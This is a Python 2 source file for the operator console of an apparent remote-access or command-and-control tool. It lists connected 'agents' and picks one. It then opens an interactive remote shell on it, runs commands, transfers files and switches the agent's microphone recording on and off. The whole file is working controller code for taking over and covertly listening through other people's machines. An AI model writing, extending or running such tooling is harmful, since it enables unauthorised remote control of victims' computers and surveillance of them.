from threading import Thread
from logging import Logger
from helpers import Colour
from cmd import Cmd
import sys, os
import shlex

class ConsoleInterface(Cmd):
    def __init__(self, server):
        Cmd.__init__(self)
        self.logger = Logger("console")
        self.server = server
        self.prompt = "[" + Colour.red("no agent", bold=True) + "]#> "
        self.current_agent = ""

    def do_set(self, line):
        if line.lower().startswith("timeout"):
            timeout = int(line.split(" ")[1])
            self.server.set_timeout(timeout)
            self.logger.info("Command timeout set to {} secs".format(timeout))

    def do_record(self, line):
        self.server.record_mic(line)

    def do_stop_recording(self, line):
        self.server.stop_recording()

    def do_exit(self, line):
        self.server.shutdown()
        return False
    
    def do_list(self, line):
        for agent in self.server.list_agents():
            print Colour.yellow(agent)

    def set_current_agent(self, agent):
        self.current_agent = agent
        self.server.set_agent(agent)
        self.prompt = "[" + Colour.red(agent, bold=True) + "]#> "

    def complete_use(self, text, line, startidx, endidx):
        return filter(lambda x: x.startswith(text), self.server.list_agents())

    def do_use(self, line):
        if line not in self.server.list_agents():
            self.logger.error("Agent does not exist")
            return

        if self.server.agent_alive(line):
            self.set_current_agent(line)
        else:
            self.logger.error("Agent is not alive!")

    def do_shell(self, line):
        self.logger.info("Interacting with [{}]".format(self.current_agent))
        self.logger.warn("Use exit to quit....")

        while True:
            cmd = raw_input("[{}]-shell #> ".format(self.current_agent))
            if cmd.lower() == "exit":
                return

            if cmd != "":
                response = self.server.run_command(cmd)
                print response

    def do_run(self, line):
        response = self.server.run_command(line)
        print response

    def do_download(self, line):
        self.server.download_file(line)

    def do_upload(self, line):
        f, target = shlex.split(line)
        response = self.server.upload_file(f, target)
        print response

    def emptyline(self):
        if self.current_agent != "":
            if not self.server.agent_alive(self.current_agent):
                self.logger.error("Agent is dead")
                self.prompt = "[" + Colour.red("no agent", bold=True) + "]#> "
                self.current_agent = ""
                self.server.set_agent(self.current_agent)
       
    def default(self, line):
        os.system(line)

    def postcmd(self, stop, line):
        if stop: sys.exit(1)


class ConsoleThread(Thread):
    def __init__(self, server):
        Thread.__init__(self)
        self.server = server
        self.logger = Logger("console")

    def run(self):
        interface = ConsoleInterface(self.server)
        interface.cmdloop()

